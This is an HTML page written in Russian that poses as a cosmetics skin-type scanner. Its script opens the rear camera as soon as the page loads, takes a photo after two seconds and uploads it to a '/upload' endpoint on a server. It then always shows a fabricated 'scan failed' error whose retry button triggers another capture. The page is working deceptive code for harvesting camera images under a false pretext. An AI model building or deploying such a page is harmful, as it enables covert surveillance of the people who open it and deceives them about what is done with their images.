<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подбор косметики</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 90vh;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        video {
            width: 100%;
            border-radius: 8px;
            background: #000;
        }
        .status {
            margin-top: 15px;
            font-size: 14px;
            color: #555;
        }
        .error-box {
            display: none;
            background-color: #ffe6e6;
            color: #d9534f;
            border: 1px solid #f5c6cb;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
        }
        button {
            background-color: #ff4d4d;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #cc0000;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Анализ типа кожи</h2>
    
    <div id="camera-section">
        <video id="video" autoplay playsinline></video>
        <p class="status" id="status-text">Наведите заднюю камеру на лицо...</p>
    </div>

    <div class="error-box" id="error-box">
        <p><strong>Ошибка сканирования!</strong></p>
        <p>Не удалось определить тип кожи. Пожалуйста, убедитесь в достаточном освещении и повторите попытку.</p>
        <button onclick="restartScan()">Повторить</button>
    </div>
</div>

<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status-text');
    const cameraSection = document.getElementById('camera-section');
    const errorBox = document.getElementById('error-box');

    let stream = null;

    async function startCamera() {
        try {
            // Запрашиваем именно заднюю камеру (facingMode: "environment")
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: "environment" } },
                audio: false
            });
            video.srcObject = stream;
        } catch (err) {
            // Если задняя камера недоступна, пробуем любую доступную камеру
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" },
                    audio: false
                });
                video.srcObject = stream;
            } catch (fallbackErr) {
                statusText.innerText = "Ошибка доступа к камере.";
                return;
            }
        }

        statusText.innerText = "Анализируем... Не двигайтесь (2 сек.)";
        
        // Автоматический снимок через 2 секунды
        setTimeout(takeAutoPhoto, 2000);
    }

    function takeAutoPhoto() {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const dataUrl = canvas.toDataURL('image/jpeg');

        statusText.innerText = "Отправка данных...";

        // Отправка снимка на Flask сервер
        fetch('/upload', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: dataUrl })
        })
        .then(response => response.json())
        .then(data => {
            // Скрываем камеру и показываем ошибку с кнопкой "Повторить"
            cameraSection.style.display = 'none';
            errorBox.style.display = 'block';
        })
        .catch(error => {
            cameraSection.style.display = 'none';
            errorBox.style.display = 'block';
        });
    }

    function restartScan() {
        errorBox.style.display = 'none';
        cameraSection.style.display = 'block';
        startCamera();
    }

    // Запуск камеры при загрузке страницы
    window.onload = startCamera;
</script>

</body>
</html>
